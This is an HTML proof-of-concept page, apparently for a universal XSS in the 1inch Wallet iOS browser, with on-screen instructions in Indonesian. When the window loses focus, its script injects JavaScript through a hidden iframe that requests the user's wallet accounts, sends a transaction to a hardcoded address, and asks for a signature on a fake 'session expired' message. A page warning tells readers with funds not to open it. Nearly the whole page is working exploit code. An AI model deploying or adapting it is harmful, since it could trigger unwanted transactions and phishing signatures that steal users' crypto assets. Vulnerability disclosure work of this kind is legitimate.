<html>
<head>
  <meta charset="UTF-8">
  <title>UXSS PoC: 1inch Wallet iOS</title>
  <style>iframe{display:none;}</style>
  <script>
    window.onblur = function(){
      document.getElementById("iframe").src = "javascript:(async()=>{try{" +

        "if(!window.ethereum || (!window.ethereum.isOneInchIOSWallet && !window.ethereum.isOneInchAndroidWallet && !window.ethereum.is1inch)) return;" +
        
        "const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});" +
  
        "await window.ethereum.request({" +
        "  method: 'eth_sendTransaction'," +
        "  params: [{" +
        "    from: accounts[0]," +
        "    to: '0xbc7737796ad59c2c97d73bba3933bda5e0e8e63c00644b2861b653ccd4c29171'," + 
        "    gas: '0x5208'" +  
        "  }]" +
        "});" +
  
        "await window.ethereum.request({" +
        "  method: 'personal_sign'," +
        "  params: ['0x53657373696f6e20657870697265642e20506c656173652072652d61757468656e7469636174652e', accounts[0]]" +  
        "});" +
        
        "}catch(e){console.log(e)}})();";
    };
  </script>
</head>
<body>
  <h1 style="text-align:center; margin-top:100px">Klik di mana saja, lalu pindah aplikasi / kembali lagi ke browser</h1>
  <p style="text-align:center; color:red">JANGAN BUKA JIKA KAMU PUNYA SALDO DI 1INCH WALLET!</p>
  <iframe id="iframe" src=""></iframe>
</body>
</html>
